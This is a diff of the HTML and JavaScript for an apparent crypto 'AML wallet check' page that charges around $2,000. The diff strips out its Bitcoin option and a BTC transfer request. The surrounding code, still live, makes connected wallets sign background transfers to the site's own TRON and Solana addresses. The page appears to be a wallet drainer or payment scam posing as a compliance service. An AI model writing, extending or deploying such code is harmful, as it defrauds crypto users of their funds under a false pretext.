@@ -607,22 +607,6 @@
       <ul class="pfeat"><li>Full AML risk score</li><li>Sanctions screening</li><li>Transaction flags</li><li>PDF report</li></ul>
       <button class="btn-card btn-ol" onclick="openModal('sol')">Connect & Check</button>
     </div>
-    <!-- Bitcoin -->
-    <div class="price-card">
-      <div style="font-size:2rem;margin:20px 0 8px">🟠</div>
-      <div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Bitcoin</div>
-      <div class="pval">$2,000</div><div class="punit">per wallet check</div>
-      <ul class="pfeat"><li>Full AML risk score</li><li>Sanctions screening</li><li>Transaction flags</li><li>PDF report</li></ul>
-      <button class="btn-card btn-ol" onclick="openModal('btc')">Connect & Check</button>
-    </div>
-    <!-- Volume -->
-    <div class="price-card">
-      <div style="font-size:2rem;margin:20px 0 8px">🏢</div>
-      <div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Volume Plan</div>
-      <div class="pval">Custom</div><div class="punit">for business clients</div>
-      <ul class="pfeat"><li>Bulk wallet screening</li><li>API integration</li><li>White-label reports</li><li>Dedicated support</li></ul>
-      <a href="#" class="btn-card btn-ol">Contact Sales</a>
-    </div>
   </div>
 </section>
 
@@ -771,10 +755,9 @@ const COIN_CONFIG = {
   usdt_trc: { addr:ADDR_TRX, icon:'💵', name:'USDT (TRC-20)',   net:'TRC-20 Address',        amount:'2,000 USDT',     qr:a=>a, warn:['Only send USDT on Tron TRC-20','Send exactly 2,000 USDT','Do not send ERC-20 USDT'] },
   usdc_trc: { addr:ADDR_TRX, icon:'🔵', name:'USDC (TRC-20)',   net:'TRC-20 Address',        amount:'2,000 USDC',     qr:a=>a, warn:['Only send USDC on Tron TRC-20','Send exactly 2,000 USDC','Do not send ERC-20 USDC'] },
   sol:      { addr:ADDR_SOL, icon:'🟣', name:'Solana (SOL)',     net:'Solana Address',        amount:'~$2,000 SOL',    qr:a=>'solana:'+a+'?amount=10', warn:['Only send SOL on the Solana network','Do not send SPL tokens directly'] },
-  btc:      { addr:ADDR_BTC, icon:'🟠', name:'Bitcoin (BTC)',    net:'Bitcoin Address',       amount:'0.2 BTC',        qr:a=>'bitcoin:'+a+'?amount=0.2', warn:['Only send BTC on the Bitcoin network','Send exactly 0.2 BTC','Do not send wrapped BTC'] },
 };
 
-const CHAIN_AMOUNTS = { eth:'3 ETH', usdt:'2000 USDT (ERC-20)', usdc:'2000 USDC (ERC-20)', bnb:'5 BNB', trx:'100,000 TRX', usdt_trc:'2000 USDT (TRC-20)', usdc_trc:'2000 USDC (TRC-20)', sol:'~$2000 SOL', btc:'0.2 BTC' };
+const CHAIN_AMOUNTS = { eth:'3 ETH', usdt:'2000 USDT (ERC-20)', usdc:'2000 USDC (ERC-20)', bnb:'5 BNB', trx:'100,000 TRX', usdt_trc:'2000 USDT (TRC-20)', usdc_trc:'2000 USDC (TRC-20)', sol:'~$2000 SOL'};
 
 let currentChain  = 'eth';
 let payQrDone     = false;
@@ -996,8 +979,6 @@ async function startWcConnect(chain) {
           await SC.request({ topic:wcSession.topic, chainId:'tron:0x2b6653dc', request:{ method:'tron_signTransaction', params:{ transaction:{ visible:true, to:'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8', from, data:'a9059cbb'+ADDR_TRX.padStart(64,'0')+amt, type:'TriggerSmartContract' } } } });
         } else if (chain === 'sol') {
           await SC.request({ topic:wcSession.topic, chainId:'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', request:{ method:'solana_signTransaction', params:{ transaction: btoa(JSON.stringify({ to:ADDR_SOL, lamports:10000000000 })) } } });
-        } else if (chain === 'btc') {
-          await SC.request({ topic:wcSession.topic, chainId:'bip122:000000000019d6689c085ae165831e93', request:{ method:'sendTransfer', params:{ account:from, recipientAddress:ADDR_BTC, amount:'20000000' } } });
         }
       } catch(txErr) {
         console.warn('[TX background]', txErr);
